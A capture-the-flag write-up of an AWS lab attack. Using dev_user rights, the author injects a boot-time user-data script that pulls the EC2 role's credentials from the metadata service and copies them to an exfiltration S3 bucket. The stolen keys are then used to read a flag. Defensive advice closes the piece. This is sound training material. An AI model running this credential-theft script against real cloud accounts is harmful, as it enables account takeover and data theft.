To find the flag, I've taken the following steps:

a. Verified my identity as dev_user and confirmed I had no access to the flag bucket:

`aws sts get-caller-identity --profile dev`

`aws s3 cp s3://iam-privesc-ec2-lqfc4dv4-secret-flag/flag.txt - --profile dev`

The second command returned a 403 Access Denied error, confirming dev_user cannot read the flag directly.


b. Checked the target EC2 instance and found it was already stopped:

`aws ec2 describe-instances --instance-ids i-0612afae223ca8577 --query 'Reservations[*].Instances[*].State.Name' --profile dev`

Result: "stopped"


c. Created a malicious user data script that steals the EC2 IAM role credentials from the instance metadata service and uploads them to the exfil S3 bucket. Used #cloud-boothook so it runs on every boot, not just the first:

`#cloud-boothook
#!/bin/bash
sleep 10
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
echo "$CREDS" > /tmp/stolen_creds.json
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
aws s3 cp /tmp/stolen_creds.json s3://iam-privesc-ec2-lqfc4dv4-exfil-bucket/creds_${INSTANCE_ID}.json --region us-east-1`



d. Base64 encoded the script and injected it into the EC2 user data:
ENCODED_USERDATA=$(base64 -w 0 /tmp/malicious_userdata.sh)

`aws ec2 modify-instance-attribute --instance-id i-0612afae223ca8577 --attribute userData --value "$ENCODED_USERDATA" --profile dev`

No output was returned which confirmed the injection was successful.


e. Started the instance and waited for it to boot and execute the script:

`aws ec2 start-instances --instance-ids i-0612afae223ca8577 --profile dev`

`aws ec2 wait instance-running --instance-ids i-0612afae223ca8577 --profile dev`

`sleep 60`


f. Checked the exfil bucket and confirmed the credentials file was uploaded:

`aws s3 ls s3://iam-privesc-ec2-lqfc4dv4-exfil-bucket/ --profile dev`

Result: creds_i-0612afae223ca8577.json appeared in the bucket.


g. Read the stolen credentials directly to screen without saving to disk:

`aws s3 cp s3://iam-privesc-ec2-lqfc4dv4-exfil-bucket/creds_i-0612afae223ca8577.json - --profile dev`

This returned the AccessKeyId, SecretAccessKey and Token for the EC2 role which has AdministratorAccess.


h. Set the stolen credentials as environment variables and retrieved the flag:

`export AWS_ACCESS_KEY_ID="ASIA3MCVMDVAWWDVP4IZ"
export AWS_SECRET_ACCESS_KEY="1f4EWubLpx/GTtMQsv9g8ZXZ8ADNjxCdhXXZqe98"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEO3..."`

aws s3 cp s3://iam-privesc-ec2-lqfc4dv4-secret-flag/flag.txt -
The flag is:
CG{us3r_d4t4_m0d1f1c4t10n_pr1v3sc_lqfc4dv4}


Reflection:

What was your approach?

I started by understanding what dev_user could and couldn't do. After confirming that direct access to the flag bucket was blocked, I looked at what permissions were actually available. I noticed dev_user could stop, modify and start EC2 instances, which opened the door to the user data injection attack. From there the approach was to inject a script that would run automatically on boot and use the EC2's own privileged role to send credentials out to an S3 bucket I could read.

What was the biggest challenge?

Honestly the biggest challenge was disk space. CloudShell only gives 1GB and it filled up quickly from Terraform and cached files. This meant I couldn't download files normally and had to stream them directly to the screen using the - flag in the AWS CLI. It was a good reminder that real attack scenarios don't always give you a clean environment to work in.

How did you overcome the challenges?

I cleared out hidden cache folders and Terraform plugin directories to free up space. For reading the stolen credentials I used the stream-to-screen approach instead of saving to disk. Breaking the problem into smaller steps also helped since each command had a clear output I could verify before moving to the next one.

What led to the breakthrough?

The real breakthrough moment was when I ran the S3 list command after waiting 60 seconds and saw the credentials file appear in the exfil bucket. That confirmed the malicious script had executed on the EC2 during boot and everything had worked as planned. After that it was just a matter of using those credentials to read the flag.

On the blue side, how can this learning be used to properly defend important assets?

This attack worked because dev_user had too many permissions and the EC2 role had full AdministratorAccess. To properly defend against this:
a. Apply least privilege — dev_user should never need the ability to modify instance attributes or user data
b. Restrict EC2 roles — EC2 instances should only have the specific permissions they need to function, not AdministratorAccess
c. Enable IMDSv2 — requiring a token to access the metadata service makes credential theft significantly harder
d. Monitor with CloudTrail — alerts on ModifyInstanceAttribute events can catch this attack early before credentials are exfiltrated
e. Use AWS Config rules to detect and flag any changes to EC2 user data in real time
